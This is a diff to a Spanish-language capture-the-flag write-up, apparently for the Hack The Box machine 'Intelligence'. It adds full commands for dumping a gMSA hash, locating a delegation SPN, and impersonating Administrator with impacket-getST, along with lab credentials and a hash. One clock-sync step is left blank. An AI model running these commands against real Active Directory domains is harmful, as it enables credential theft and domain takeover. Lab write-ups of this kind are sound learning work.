@@ -291,9 +291,13 @@ Usaremos una herramienta llamada [[GMSADUMPER]] `https://github.com/micahvandeus
 `python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -l 10.10.10.248 -d intelligence.htb`
 
 Obtendremos un hash que es el perteneciente al service account
-`5389896c2609ab8717b9d8f360f760ae`
+`:5389896c2609ab8717b9d8f360f760ae`
 
 Con este hash vamos a poder impersonar al usuario
 Usaremos [[impacket-getST]] que nos va a permitir impersonar al usuario administrador
 - Antes necesitaremos obtener el SPN par alo cual usaremos la herramienta [[PYWERVIEW]]
-	`pywerview get-netcomputer -u 'Ted.Graves' -t 10.10.10.248` pedira introducir la contraseña y nos mostrara los dnshostnames
+	`pywerview get-netcomputer -u 'Ted.Graves' -t 10.10.10.248 --full-data` pedira introducir la contraseña y nos mostrara el SPN en `msds-allowedtodelegateto`, lo cpiaremos y lo usaremos en la herramienta de impacket
+
+- Tendremos que setear el relog a la misma hora que de la maquibna victima con ``
+
+`impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrador intelligence.htb/svc_int -hashes :5389896c2609ab8717b9d8f360f760ae`
